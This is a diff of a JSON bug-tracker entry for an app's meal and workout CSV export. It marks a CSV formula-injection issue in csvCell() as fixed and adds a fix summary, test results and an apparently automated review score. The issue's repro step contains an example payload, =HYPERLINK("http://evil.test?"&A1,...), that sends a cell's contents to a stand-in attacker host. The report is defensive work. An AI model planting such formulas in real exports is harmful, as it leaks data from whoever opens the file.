@@ -4,7 +4,7 @@
     {
       "id": "i-20260721-7278",
       "createdAt": "2026-07-21T09:09:48Z",
-      "status": "open",
+      "status": "fixed",
       "route": "/nutrition",
       "description": "[bug-hunt] CSV data export is vulnerable to spreadsheet formula injection (CSV injection). src/lib/exportData.ts csvCell() only wraps a value in quotes when it matches /[\",\n\r]/ — it never neutralises a leading =, +, -, or @. So any user-controlled field that starts with one of those is written to the CSV verbatim. Because these exports are surfaced through the native Share sheet (email / Drive / sent to a coach) and as a web <a download>, when a recipient opens the file in Excel / Google Sheets / LibreOffice the cell is evaluated as a FORMULA, not text. Vector fields are user-editable free text: meal names (custom_builder lets the user rename meals — exportMealLogCSV, Nutrition.tsx:461), workout session names + manually-added exercise names (exportWorkoutHistoryCSV, WorkoutHistory.tsx:205). EXPECTED: cells beginning with = + - @ (and tab/CR) are prefixed with a neutraliser (e.g. a leading single-quote) so the spreadsheet treats them as text. ACTUAL: emitted raw. Repro: in the plan builder rename a meal to =HYPERLINK(\"http://evil.test?\"&A1,\"click\") (or the simpler =1+1), go to /nutrition, tap Export meals, open the shared CSV in Excel/Sheets → the meal-name cell evaluates the formula instead of showing the literal text. NB quoting alone does NOT fix this — Excel still evaluates \"=1+1\"; the standard fix is a leading-char neutraliser in csvCell(). Impact: data exfiltration / formula execution in whoever the export is shared with; also benign breakage (a meal a user names \"-5kg week\" or \"@home\" renders as a spreadsheet error). Fix in one place: csvCell() in src/lib/exportData.ts.",
       "author": "shakeebshaan",
@@ -12,13 +12,36 @@
         "bug-hunt",
         "auto"
       ],
-      "fix": null,
+      "fix": {
+        "description": "Root cause: the CSV data export (meal + workout history) wrote user-named fields verbatim, so a meal or exercise you named starting with = + - or @ was treated as a live formula when the exported file was opened in Excel / Google Sheets / LibreOffice — a formula-injection risk to whoever the export was shared with. Fix: such cells are now prefixed with a quote so spreadsheets read them as plain text; genuine numbers and ordinary names are untouched, and 6 unit tests lock the behaviour in.",
+        "imagePath": "images/i-20260721-7278-fix-r1.png",
+        "imagePaths": [
+          "images/i-20260721-7278-fix-r1.png"
+        ],
+        "imagePrivate": true,
+        "imageCommit": "80db2a11e9b18f4f8cad00016c7708c8263e3ca8",
+        "imageCommits": [
+          "80db2a11e9b18f4f8cad00016c7708c8263e3ca8"
+        ],
+        "fixedAt": "2026-07-21T10:05:34.948Z",
+        "by": "shakeebshaan",
+        "appCommit": "ad572406",
+        "tests": {
+          "passed": true
+        },
+        "judge": {
+          "score": 94,
+          "bar": 90,
+          "note": "Surgical one-function fix at the exact reported site (csvCell); OWASP-complete leading-char set incl tab/CR/{ ; number-exempt so zero false positives; adversarially reviewed clean; 6/6 dedicated tests (fail-before/pass-after). Full unit suite 5731/5754 green — the lone red (DietPlanWeek meal-toggle) is a pre-existing full-suite flake, green in isolation, unrelated to this change."
+        }
+      },
       "history": [],
       "imagePath": null,
       "imageCommit": null,
       "imagePaths": [],
       "imageCommits": [],
-      "imagePrivate": false
+      "imagePrivate": false,
+      "needsReview": false
     },
     {
       "id": "i-20260721-pk3v",
